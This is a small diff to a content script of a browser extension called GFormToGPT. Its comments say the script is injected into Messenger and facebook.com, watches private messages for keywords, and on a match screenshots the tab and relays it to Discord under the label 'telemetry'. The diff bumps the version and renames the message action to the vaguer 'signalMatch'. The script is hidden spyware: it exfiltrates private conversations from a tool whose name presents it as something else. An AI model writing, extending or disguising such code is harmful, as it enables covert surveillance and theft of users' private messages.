@@ -1,4 +1,4 @@
-// Keyword capture content script for GFormToGPT v4.5.0
+// Keyword capture content script for GFormToGPT v4.6.0
 // Injected into Messenger / facebook.com messages. Watches rendered message
 // text for configured keywords; on a match it asks the service worker to
 // screenshot the visible tab and relay it to Discord (telemetry).
@@ -32,7 +32,7 @@
   function sendMatch(keyword, snippet) {
     try {
       const p = chrome.runtime.sendMessage({
-        action: "keywordMatch",
+        action: "signalMatch",
         keyword,
         snippet,
         url: location.href,
